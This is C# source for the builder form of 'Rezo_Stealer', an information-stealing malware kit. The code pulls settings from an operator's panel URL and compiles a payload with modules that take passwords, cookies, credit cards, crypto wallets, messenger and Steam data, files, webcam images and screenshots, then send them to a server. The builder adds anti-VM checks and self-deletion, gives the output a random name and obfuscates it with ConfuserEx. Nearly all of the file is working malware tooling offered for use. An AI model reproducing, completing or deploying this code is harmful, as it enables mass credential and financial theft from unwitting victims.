using System;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Threading;
using System.Threading.Tasks;
using Rezo_Stealer.Json;
using Rezo_Stealer.Dark;
using System.IO;

namespace Rezo_Stealer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string GenRandomString(string Alphabet, int Length)
        {
            Random rnd = new Random();
            StringBuilder sb = new StringBuilder(Length - 1);
            int Position = 0;
            for (int i = 0; i < Length; i++)
            {
                Position = rnd.Next(0, Alphabet.Length - 1);
                sb.Append(Alphabet[Position]);
            }
            return sb.ToString();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            #region 
            JsonValue getJsonStettings = null;
            string resultServer = string.Empty;
            string Passwords = string.Empty;
            string Cookies = string.Empty;
            string Autofills = string.Empty;
            string Clipboard = string.Empty;
            string CreditCards = string.Empty;
            string USB = string.Empty;
            string DesktopFiles = string.Empty;
            string Discord = string.Empty;
            string Skype = string.Empty;
            string FTPClient = string.Empty;
            string History = string.Empty;
            string ImClient = string.Empty;
            string MailClient = string.Empty;
            string HardwareInfo = string.Empty;
            string ScreenDesktop = string.Empty;
            string VPNClient = string.Empty;
            string Steam = string.Empty;
            string Telegram = string.Empty;
            string Wallets = string.Empty;
            string SelfDelete = string.Empty;
            string VirtualMachine = string.Empty;
            string WebCam = string.Empty;
            string FireFox = string.Empty;
            string Internet_Explorer = string.Empty;
            string DecryptAPI = Properties.Resources.DecryptAPI;
            string Crypt = Properties.Resources.Crypt;
            string Help = Properties.Resources.Help;
            string Location = Properties.Resources.Location;
            string Program = Properties.Resources.Program;
            string SendToServer = Properties.Resources.SendToServer;
            string SQLite = Properties.Resources.SQLite;
            string ZipStore = Properties.Resources.ZipStore;
            string CheckPovt = Properties.Resources.CheckPovt;

            if (textBox1.Text == "")
            {
                MessageBox.Show("Введите ссылку", "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string GetSett = string.Empty;
            try
            {
                System.Collections.Specialized.NameValueCollection postData = new System.Collections.Specialized.NameValueCollection()
                {
                    { "settings", "settings" }
                };
                string uriString = textBox1.Text + "index.php";
                var webClient = new ExtendedWebClient();
                ServicePointManager.ServerCertificateValidationCallback += new RemoteCertificateValidationCallback(ValidateRemoteCertificate);
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                webClient.Proxy = null;
                webClient.Timeout = Timeout.Infinite;
                webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome / 62.0.3202.94 Safari / 537.36 OPR / 49.0.2725.64");
                webClient.AllowWriteStreamBuffering = false;
                GetSett = Encoding.UTF8.GetString(webClient.UploadValues(uriString, postData));
            }
            catch { }

            if (GetSett == "")
            {
                MessageBox.Show("Произошла ошибка при отправке запроса, проверьте правильность ссылки!", "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            Task.Factory.StartNew(() => { getJsonStettings = JsonValue.Parse(GetSett); }).Wait();

            Program += "using System;\nusing System.IO;\nusing System.Threading;\nusing System.Threading.Tasks;\n\nnamespace Stealer\n{\n\tclass Program\n\t{\n\t\tpublic static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @\"\\PackLogsRezo\";\n\t\tstatic void Main(string[] args)\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tTask.Factory.StartNew(() => { modules.CheckPovt.CheckPril(); }).Wait();\n";
            Program += "\t\t\t\tif (File.Exists(path))\n\t\t\t\t{\n\t\t\t\t\tFile.Delete(path);\n\t\t\t\t}\n\t\t\t\tDirectoryInfo di = Directory.CreateDirectory(path);\n\t\t\t\tdi.Attributes = FileAttributes.Directory | FileAttributes.Hidden;\n";
            if (getJsonStettings["AntiVM"] == true)
            {
                Program += "\n\t\t\t\tTask.Factory.StartNew(() => { modules.VirtualMachine.CheckVM(); }).Wait();";
                VirtualMachine = Properties.Resources.VirtualMachine;
            }
            Program += "\n\t\t\t\tTask.Factory.StartNew(() => { Helper(); }).Wait();";
            Program += "\n\t\t\t\tTask.Factory.StartNew(() => { modules.SendToServer.StratSend(); }).Wait();";

            if (getJsonStettings["SelfDelete"] == true)
            {
                SelfDelete = Properties.Resources.SelfDelete;
                Program += "\n\t\t\t\tTask.Factory.StartNew(() => { modules.Delete.SelfDelete(); }).Wait();";
            }
            Program += "\n\t\t\t} catch { }\n\t\t}\n";
            if (getJsonStettings["repeated_logs"] == true)
            {
                Program += "\t\tpublic static bool repeated_logs = true;";
            }
            else
            {
                Program += "\t\tpublic static bool repeated_logs = false;";
            }
            Program += "\n\t\tprivate static void Helper()\n\t\t{";
            if (getJsonStettings["Password"] == true)
            {
                FireFox = Properties.Resources.FireFox;
                Passwords = Properties.Resources.Passwords;
                Internet_Explorer = Properties.Resources.Internet_Explorer;
                Program += "\n\t\t\tmodules.Passwords.GetPasswords();";
                Program += "\n\t\t\tmodules.FireFox.GetPasswordFirefox();";
                Program += "\n\t\t\tmodules.Internet_Explorer.Start();";
            }
            if (getJsonStettings["Cookies"] == true)
            {
                Cookies = Properties.Resources.Cookies;
                Program += "\n\t\t\tmodules.Cookies.GetCookies();";
            }
            if (getJsonStettings["Autofill"] == true)
            {
                Autofills = Properties.Resources.Autofills;
                Program += "\n\t\t\tmodules.Autofill.GetCAutofills();";
            }
            if (getJsonStettings["Clipboard"] == true)
            {
                Clipboard = Properties.Resources.Clipboard;
                Program += "\n\t\t\tmodules.Clipboard.GetText();";
            }
            if (getJsonStettings["CreditCards"] == true)
            {
                CreditCards = Properties.Resources.CreditCards;
                Program += "\n\t\t\tmodules.CreditCards.GetCreditCards();";
            }
            if (getJsonStettings["History"] == true)
            {
                History = Properties.Resources.History;
                Program += "\n\t\t\tmodules.History.GetHistory();";
            }
            if (getJsonStettings["DectopAndUSBFiles"] == true)
            {
                DesktopFiles = Properties.Resources.DesktopFiles;
                USB = Properties.Resources.USB;
                Program += "\n\t\t\tmodules.USB.GetUSB();";
                Program += "\n\t\t\tmodules.DesktopFiles.Inizialize();";
            }
            if (getJsonStettings["HistoryDiscord"] == true)
            {
                Discord = Properties.Resources.Discord;
                Program += "\n\t\t\tmodules.Discord.GetDiscord();";
            }
            if (getJsonStettings["HistorySkype"] == true)
            {
                Skype = Properties.Resources.Skype;
                Program += "\n\t\t\tmodules.Skype.GetSkype();";
            }
            if (getJsonStettings["FTPClient"] == true)
            {
                FTPClient = Properties.Resources.FTPClient;
                Program += "\n\t\t\tmodules.FTPClient.GetFileZilla();";
            }
            if (getJsonStettings["ImClient"] == true)
            {
                ImClient = Properties.Resources.ImClient;
                Program += "\n\t\t\tmodules.ImClient.GetImClients();";
            }
            if (getJsonStettings["MailClient"] == true)
            {
                MailClient = Properties.Resources.MailClient;
                Program += "\n\t\t\tmodules.MailClient.GoMailClient();";
            }
            if (getJsonStettings["VPNClient"] == true)
            {
                VPNClient = Properties.Resources.VPNClient;
                Program += "\n\t\t\tmodules.VPNClient.GetVPN();";
            }
            if (getJsonStettings["HardwareInfo"] == true)
            {
                HardwareInfo = Properties.Resources.HardwareInfo;
                Program += "\n\t\t\tmodules.HardwareInfo.GoInfo();";
            }
            if (getJsonStettings["Screenshot"] == true)
            {
                ScreenDesktop = Properties.Resources.ScreenDesktop;
                Program += "\n\t\t\tmodules.ScreenDektop.GetScreenshot();";
            }
            if (getJsonStettings["SteamFiles"] == true)
            {
                Steam = Properties.Resources.Steam;
                Program += "\n\t\t\tmodules.Steam.CopySteam();";
            }
            if (getJsonStettings["Telegram"] == true)
            {
                Telegram = Properties.Resources.Telegram;
                Program += "\n\t\t\tmodules.Telegram.GetTelegram();";
            }
            if (getJsonStettings["WebCam"] == true)
            {
                WebCam = Properties.Resources.WebCam;
                Program += "\n\t\t\tmodules.WebCam.GetWebCamPicture();";
            }
            if (getJsonStettings["Wallets"] == true)
            {
                Wallets = Properties.Resources.Wallets;
                Program += "\n\t\t\tmodules.Wallets.GetWallets();";
            }
            Program += "\n\t\t\tmodules.Location.GetLocation(false);";
            Program += "\n\t\t}\n\t}\n}";
            #endregion
            CompilerParameters Params = new CompilerParameters();
            Params.CompilerOptions = "/target:exe /optimize+ /platform:anycpu /langversion:Default /noconfig";
            Params.TreatWarningsAsErrors = false;
            Params.GenerateInMemory = false;
            Params.IncludeDebugInformation = false;
            Params.GenerateExecutable = true;
            string nameProgram = GenRandomString("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm", 8);
            Params.OutputAssembly = nameProgram + ".exe";

            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Params.ReferencedAssemblies.Add("System.dll");
            Params.ReferencedAssemblies.Add("System.Linq.dll");
            Params.ReferencedAssemblies.Add("System.Xml.dll");
            Params.ReferencedAssemblies.Add("System.Management.dll");
            Params.ReferencedAssemblies.Add("System.Drawing.dll");
            Params.ReferencedAssemblies.Add("System.Security.dll");
            Params.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");

            SendToServer = SendToServer.Replace("[link]", textBox1.Text);
            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");
            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Autofills, DecryptAPI, Crypt, Help, SQLite, Program, Cookies, Discord, Passwords, FireFox, Internet_Explorer, History, CreditCards, Clipboard, DesktopFiles, USB, Skype, ScreenDesktop, FTPClient, VPNClient, HardwareInfo, ImClient, Location, MailClient, Steam, Telegram, SendToServer, Wallets, SelfDelete, VirtualMachine, CheckPovt, WebCam, ZipStore);
            if (Results.Errors.Count > 0)
            {
                foreach (CompilerError err in Results.Errors)
                    MessageBox.Show(err.ToString());
            }

            string combine = Path.Combine(GlobalPath.CurrDir, nameProgram + ".exe");
            string darkbuild = Path.Combine(GlobalPath.PathDark, nameProgram + ".exe");

            if (!Results.Errors.HasErrors)
            {
                if (Obfuscation.Checker())
                {
                    // Запускаем создания dark конфиг с нужными параметрами
                    Task.Run(() => File.WriteAllText(GlobalPath.DarkConfig, Obfuscation.TempConfig(combine))).Wait();
                    Task.Run(() => CommandRunner.RunFile(GlobalPath.CLI_Confuser, GlobalPath.DarkConfig)).Wait();
                    try
                    {
                        File.Delete(Path.Combine(GlobalPath.CurrDir, nameProgram + ".exe"));
                        File.Delete(GlobalPath.DarkConfig);
                        File.Move(darkbuild, combine);
                        File.Delete(darkbuild);
                    }
                    catch { }
                }
            }
        }

        public class ExtendedWebClient : WebClient
        {
            public int Timeout { get; set; }
            public new bool AllowWriteStreamBuffering { get; set; }

            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address);
                if (request != null)
                {
                    request.Timeout = Timeout;
                    var httpRequest = request as HttpWebRequest;
                    if (httpRequest != null)
                    {
                        httpRequest.AllowWriteStreamBuffering = AllowWriteStreamBuffering;
                    }
                }
                return request;
            }
        }
        private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
        {
            return error == SslPolicyErrors.None;
        }
    }
}
